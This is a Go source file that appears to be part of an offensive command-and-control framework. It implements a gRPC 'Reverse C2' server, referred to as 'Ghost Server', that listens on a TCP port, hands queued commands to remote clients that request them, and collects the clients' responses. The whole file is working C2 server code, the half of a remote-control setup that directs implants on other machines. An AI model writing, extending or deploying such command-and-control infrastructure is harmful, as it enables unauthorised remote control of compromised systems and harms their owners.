package lib

import (
	"context"
	"errors"
	"log"
	"net"

	pb "github.com/bartimus-primed/proto/reverse/reverse_pb"

	"google.golang.org/grpc"
)

const (
	port = ":50551"
)

var commandChannel chan *pb.Command
var responseChannel chan *pb.Response
var s *grpc.Server

// server is used to implement Ghost Server.
type server struct {
	pb.UnimplementedReverseInteractServer
}

func (s *server) GetCommand(ctx context.Context, in *pb.Response) (*pb.Command, error) {
	if in.GetSuccess() {
		// Client ran command successfully
		responseChannel <- in
		// os.Exit(0)
	}
	if in.GetReady() {
		for command := range commandChannel {
			return command, nil
		}
	}
	return nil, errors.New("not ready")
}

func Start_Reverse_C2(cmd_chan chan *pb.Command, resp_chan chan *pb.Response) {
	commandChannel = cmd_chan
	responseChannel = resp_chan
	lis, err := net.Listen("tcp", port)
	if err != nil {
		log.Printf("failed to listen: %v", err)
	}
	s = grpc.NewServer()
	pb.RegisterReverseInteractServer(s, &server{})
	log.Printf("server listening at %v", lis.Addr())
	if err := s.Serve(lis); err != nil {
		log.Fatalf("failed to serve: %v", err)
	}
}
func Stop_Reverse_C2() {
	s.Stop()
}
